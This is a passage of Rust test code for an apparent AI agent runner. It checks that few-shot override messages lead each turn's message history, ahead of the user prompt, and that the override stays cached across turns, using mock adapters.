        long_context: CapabilityClaim::Supported,
        context_window_tokens: 200_000,
    };
    let mut wrapped = MockAdapterWithOverride::new();
    wrapped.inner =
        atelier_core::adapter::MockAdapter::new("mock:override-test").with_capabilities(caps);
    wrapped.queue_envelope_done_sentinel();
    let received = wrapped.received.clone();
    let expected_override = wrapped.override_messages.clone();
    let adapter: Arc<dyn atelier_core::adapter::Adapter> = Arc::new(wrapped);

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses: vec![] }, // displaced below
        EventSink::Null,
    )
    .expect("mock runner construction is infallible")
    .with_adapter_for_test(adapter)
    .with_max_turns(2);

    let _ = runner.run("user prompt body".into()).await.unwrap();

    let calls = received.lock();
    assert!(
        !calls.is_empty(),
        "the runner must have invoked adapter.chat() at least once"
    );
    // First turn's message history: override messages must lead.
    let first = &calls[0];
    assert!(
        first.len() > expected_override.len(),
        "expected >{} messages (override + user prompt), got {}",
        expected_override.len(),
        first.len(),
    );
    for (i, m) in expected_override.iter().enumerate() {
        assert_eq!(
            &first[i], m,
            "few-shot override message {i} mismatch:\n  expected: {m:?}\n  got: {:?}",
            first[i],
        );
    }
    // The user prompt is appended right after the override pair.
    assert_eq!(first[expected_override.len()].content, "user prompt body");
    assert_eq!(
        first[expected_override.len()].role,
        atelier_core::adapter::Role::User,
    );
}

#[tokio::test]
async fn few_shot_override_is_cached_across_turns_not_recomputed() {
    // The override is computed once per session. We can observe this
    // indirectly: across multiple turns, every per-turn message history
    // must carry the same override messages at the head (a re-query
    // that returned a different `Some` would surface). The cache is
    // also stress-tested by `with_adapter_for_test`, which clears it on
    // swap; without the swap, the cache remains hot from session start.
    use atelier_core::adapter::{Capabilities, CapabilityClaim};

    let workspace = tempfile::TempDir::new().unwrap();
    let mut wrapped = MockAdapterWithOverride::new();
    wrapped.inner = atelier_core::adapter::MockAdapter::new("mock:override-test")
        .with_capabilities(Capabilities {
            native_tool_use: CapabilityClaim::Unsupported,
            streaming: CapabilityClaim::Supported,
            vision: CapabilityClaim::Unsupported,
            prompt_cache: CapabilityClaim::Unsupported,
            structured_output: CapabilityClaim::Supported,
            long_context: CapabilityClaim::Supported,
            context_window_tokens: 200_000,
        });
    // Two turns: a no-envelope turn (continues loop) followed
    // by a claimed_done turn carrying the envelope via sentinel.
    wrapped.queue_text_only("thinking...");
    wrapped.queue_envelope_done_sentinel();
    let received = wrapped.received.clone();
    let expected_first = wrapped.override_messages[0].clone();
    let adapter: Arc<dyn atelier_core::adapter::Adapter> = Arc::new(wrapped);

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses: vec![] },
        EventSink::Null,
    )
    .expect("mock runner construction is infallible")
    .with_adapter_for_test(adapter)
    .with_max_turns(4);

    let _ = runner.run("multi-turn prompt".into()).await.unwrap();

    let calls = received.lock();
    assert!(
        calls.len() >= 2,
        "expected ≥2 chat() calls, got {}",
        calls.len()
    );
    // Override messages persist at the head of every turn's history.
    for (turn_ix, history) in calls.iter().enumerate() {
        assert_eq!(
            history[0], expected_first,
            "turn {turn_ix} must still carry the override at position 0; \
             a per-turn re-query would break the cache contract",
        );
    }
}
